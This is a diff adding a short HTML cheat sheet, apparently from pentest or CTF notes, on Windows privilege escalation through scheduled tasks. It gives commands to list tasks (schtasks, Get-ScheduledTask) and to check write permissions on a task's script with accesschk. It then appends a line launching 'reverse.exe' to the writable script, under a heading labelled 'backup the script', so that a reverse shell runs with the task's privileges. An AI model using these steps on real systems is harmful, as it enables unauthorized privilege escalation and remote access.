@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>scheduled tasks</title>
+</head><body>List all scheduled tasks your user can see:<br/>
+<br/>
+<br/>
+schtasks /query /fo LIST /v<br/>
+<br/>
+<br/>
+in powershell<br/>
+<br/>
+PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State<br/>
+<br/>
+Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.<br/>
+<br/>
+<br/>
+<br/>
+Find the interesting file that probably run with schedule<br/>
+(ex: CleanUp.ps1)<br/>
+<br/>
+<br/>
+<b>Verify the access</b><br/>
+<br/>
+.\accesschk.exe /accepteula -quv user CleanUp.ps1<br/>
+<br/>
+check: FILE_APPEND_DATA or FILE_WRITE_DATA<br/>
+<br/>
+<b>backup the script</b><br/>
+<br/>
+<br/>
+echo C:\&lt;user&gt;\reverse.exe &gt;&gt; CleanUp.ps1<br/>
+<br/>
+<b>wait the response</b></body></html>
